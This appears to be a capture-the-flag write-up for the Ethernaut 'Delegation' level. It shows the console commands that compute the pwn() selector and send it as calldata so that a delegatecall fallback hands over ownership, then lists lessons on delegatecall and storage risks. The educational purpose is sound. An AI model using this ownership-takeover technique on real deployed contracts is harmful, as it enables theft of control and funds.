# Delegation

## Objective

Exploit the misuse of `delegatecall` in the Delegation contract to become the owner and complete the level.

---

## Getting Started

1. Go to [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
2. Select the **"Delegation"** level
3. Click **“Get new instance”** and approve the transaction in MetaMask
4. The instance is now deployed and available as the `contract` object in the browser console
5. Save the instance address:

    ```js
    contract.address
    ```

---

## Walkthrough

### Step 1: Obtain the Function Selector for `pwn()`

```js
web3.utils.keccak256("pwn()").slice(0,10)
```

**Explanation:**
This computes the function selector for the `pwn()` function, which is required to trigger the fallback function via a low-level call.

---

### Step 2: Call the Fallback Function with the Selector

```js
await web3.eth.sendTransaction({
     from: player,
     to: contract.address,
     data: "0xdd365b8b"
});
```

**Explanation:**
This sends a transaction to the contract with the `pwn()` selector as calldata. The fallback function uses `delegatecall` to execute `pwn()` in the context of the Delegation contract, making you the owner.

---

### Step 3: Verify Ownership

```js
await contract.owner()
```

**Explanation:**
Checks if your address is now the owner, confirming the exploit was successful.

---

## What You Learn

This level teaches the following:

* How `delegatecall` executes code in the context of the calling contract
* The risks of forwarding calldata with `delegatecall` and fallback functions
* How storage layout affects contract security and can lead to vulnerabilities
* Defensive patterns to avoid storage collisions and unsafe delegatecalls

---

## Resources Used

* [Ethernaut Game](https://ethernaut.openzeppelin.com/)
* [Solidity Docs – delegatecall](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries)
* [Blog: How to Hack Solidity Contracts with delegatecall](https://shubhamm.me/blog/ethernaut_challenges_delegation)

---
